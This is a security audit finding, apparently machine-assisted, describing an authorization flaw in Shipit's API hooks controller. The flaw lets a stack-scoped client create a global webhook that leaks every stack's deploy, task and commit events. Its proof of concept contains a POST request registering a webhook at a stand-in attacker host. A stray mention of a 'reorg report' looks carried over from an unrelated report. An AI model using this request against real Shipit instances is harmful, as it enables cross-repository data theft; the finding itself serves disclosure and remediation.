### Title
API client scoped to a single stack can create a global webhook that reads/observes every stack's events - ([File: app/controllers/shipit/api/hooks_controller.rb])

### Summary
### Finding Description
An `ApiClient` can be created with a `stack` association that is meant to restrict its authority to a single `Stack`: `belongs_to :stack, optional: true` [1](#0-0) , and the base API controller enforces this by scoping the visible stacks with `current_api_client.stack_id? ? Stack.where(id: current_api_client.stack_id) : Stack.all` [2](#0-1) . This is the intended equality binding: **stack the token authorizes == stack the operation touches**.

`Api::HooksController#create`, however, derives the hook's `stack_id` purely from an *optional request parameter*, not from the authenticated client's stack scope:
```ruby
def hooks
  Hook.where(stack_id:)
end

def stack_id
  stack.id if params[:stack_id].present?
end
``` [3](#0-2) 

If `params[:stack_id]` is absent, `stack_id` is `nil`, and `hooks.create(params)` inserts a `Hook` with `stack_id: nil` — a **global hook** (per `scope :global, -> { where(stack_id: nil) }` [4](#0-3) ). Global hooks are delivered for every stack's events, since `Hook.for_stack(stack_id)` matches `where(stack_id: [nil, stack_id])` [5](#0-4)  and `Hook.deliver` iterates `for_stack(stack_id).listening_event(event)` for every emitted event across the app [6](#0-5) .

The only authorization gate on this action is the permission-name check `require_permission :write, :hook, only: %i[create update destroy]` [7](#0-6) , which only verifies that `"write:hook"` is in `ApiClient#permissions` [8](#0-7)  — it never checks `current_api_client.stack_id`. Nothing re-validates that the client's own `stack` scope is being respected when the `stack_id` param is simply omitted.

This is the same trust-binding failure pattern as the reorg report: the factory/creation call (`Hook.create`) is executed based on an attacker-influenced/absent input (missing `stack_id`) rather than on the value that was actually authorized (the client's bound `stack_id`), producing an object (a global hook) whose scope exceeds what was granted.

### Impact Explanation
An `ApiClient` issued with `write:hook` permission and scoped to one stack (`stack_id` set) is expected, by the design of `stacks`/`stack` scoping used everywhere else in `BaseController`, to only be able to affect that one stack. Via `hooks#create` it can instead register a webhook that will fire on `stack`, `review_stack`, `task`, `deploy`, `rollback`, `lock`, `commit_status`, `deployable_status`, `merge_status`, `merge`, and `pull_request` events [9](#0-8)  for **every** stack managed by the Shipit instance, not just its own — an unauthenticated-read/cross-repository-observation escalation: the client can exfiltrate deploy output, task streams, and commit/PR status for repositories it was never granted access to, by pointing `delivery_url` at an attacker-controlled endpoint.

### Likelihood Explanation
Exploitation requires only possession of a legitimately-issued, stack-scoped `ApiClient` token with `write:hook` permission (a normal, documented capability, not a privileged edge case) and a single unauthenticated API call omitting `stack_id`. No race condition, chain reorg, or timing dependency is needed — the omission is deterministic and always reachable.

### Recommendation
In `Api::HooksController`, when the current API client is stack-scoped (`current_api_client.stack_id?`), force `stack_id` to `current_api_client.stack_id` regardless of the request parameter, and reject (422/403) any attempt to create/update a hook without a `stack_id` while stack-scoped, instead of silently falling back to a global hook.

### Proof of Concept
1. Create/obtain an `ApiClient` scoped to `stack: shipit` with `permissions: ['write:hook']` (analogous to fixture `here_come_the_walrus`, which is stack-scoped, plus `write:hook`) [10](#0-9) .
2. Authenticate with that token and call:
   `POST /api/hooks` with body `{ "delivery_url": "https://attacker.example/hook", "events": ["deploy", "task", "commit_status"] }` — omit `stack_id`.
3. `Api::HooksController#stack_id` returns `nil` because `params[:stack_id]` is blank [11](#0-10) , so `Hook.where(stack_id: nil).create(params)` persists a global `Hook`.
4. From then on, `Hook.deliver(event, stack_id, payload)` matches this hook for `for_stack(any_other_stack_id)` (`where(stack_id: [nil, stack_id])`) [6](#0-5) , so deploy/task/commit-status events from stacks the token was never authorized for are POSTed to the attacker's `delivery_url`.
